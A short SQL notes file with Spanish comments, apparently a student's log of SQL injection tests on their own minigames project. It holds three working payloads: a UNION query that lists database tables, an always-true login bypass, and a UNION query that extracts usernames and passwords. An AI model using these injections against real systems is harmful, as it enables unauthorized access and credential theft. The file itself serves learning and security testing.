/*
    Archivo de Pruebas SQL - Inyección SQL
    Proyecto: Minijuegos
    
    Aquí guardo las consultas que he ido probando.
*/

-- 1. Prueba INFORMATION_SCHEMA
-- Mi Objetivo: Listar tablas de la base de datos
-- Formulario donde lo he probado: Buscador
SELECT * 
FROM minijuego 
WHERE nombre LIKE '%' 
UNION 
SELECT table_name, null, null, null, null 
FROM information_schema.tables 
WHERE table_schema = 'minijuegos_db' -- %';

-- 2. Prueba Login Bypass
-- Mi Objetivo: Hacer login sin contraseña (haciendo que sea siempre verdadero)
-- Formulario donde lo he probado: Login
SELECT * 
FROM usuarios 
WHERE usuario = '' OR '1'='1' AND password = '' OR '1'='1';

-- 3. Prueba Obtención de Datos
-- Mi Objetivo: Extraer usuarios y contraseñas de la tabla usuarios
-- Formulario donde lo he probado: Buscador
SELECT * 
FROM minijuego 
WHERE nombre LIKE '%' 
UNION 
SELECT usuario, password, null, null, null 
FROM usuarios -- %';
